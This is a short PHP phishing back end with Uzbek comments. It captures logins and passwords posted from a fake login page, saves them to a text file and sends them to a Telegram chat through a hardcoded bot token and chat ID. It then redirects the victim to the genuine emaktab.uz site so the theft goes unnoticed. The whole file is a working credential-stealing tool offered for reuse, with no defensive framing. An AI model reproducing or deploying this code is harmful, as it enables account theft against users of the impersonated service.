<?php
// Ma'lumotlarni faylga yozish
file_put_contents("logins.txt", "Login: " . $_POST['login'] . " | Parol: " . $_POST['password'] . "\n", FILE_APPEND);

$login = $_POST['login'];
$password = $_POST['password'];

// Xabar formatlash
$message = "Yangi kirish!\nLogin: $login\nParol: $password";

// Telegram sozlamalari
$token = "7915945887:AAGAwdx5DPsJ9x7zqzLtozinesXYFvwFCE0"; // O'z tokeningizni yozing
$chat_id = "6948346741"; // O'z CHAT IDingizni yozing

// Telegramga jo'natish
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
file_get_contents($url);


// Foydalanuvchini asl saytga yo'naltirish
header("Location: https://emaktab.uz");
exit();
?>
